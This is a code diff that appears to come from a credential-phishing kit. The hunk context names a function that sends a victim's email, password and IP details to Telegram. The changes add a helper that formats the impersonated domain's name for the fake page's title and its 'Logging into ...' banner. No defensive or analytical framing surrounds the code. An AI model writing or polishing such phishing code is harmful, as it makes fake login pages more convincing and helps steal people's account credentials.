@@ -116,12 +116,18 @@ function sendToTelegram(email, password, ipInfo) {
     });
 }
 
+function extractDomainName(fullDomain) {
+    if (!fullDomain) return '';
+    let name = fullDomain.split('.')[0];
+    name = name.charAt(0).toUpperCase() + name.slice(1);
+    return name;
+}
+
 function updateDomainTitle(domain) {
     const titleElement = document.getElementById('domainTitle');
     if (titleElement && domain) {
-        let displayDomain = domain.replace(/^www\./, '');
-        displayDomain = displayDomain.charAt(0).toUpperCase() + displayDomain.slice(1);
-        titleElement.textContent = displayDomain;
+        const displayName = extractDomainName(domain);
+        titleElement.textContent = displayName;
     }
 }
 
@@ -298,7 +304,8 @@ async function fetchDomainLogo(domain) {
 function showDomainInfo(domain) {
     const domainInfoDiv = document.getElementById('domainInfo');
     if (domainInfoDiv && domain) {
-        domainInfoDiv.innerHTML = `<span>Logging into ${domain}</span>`;
+        const displayName = extractDomainName(domain);
+        domainInfoDiv.innerHTML = `<span>Logging into ${displayName}</span>`;
     }
 }
 
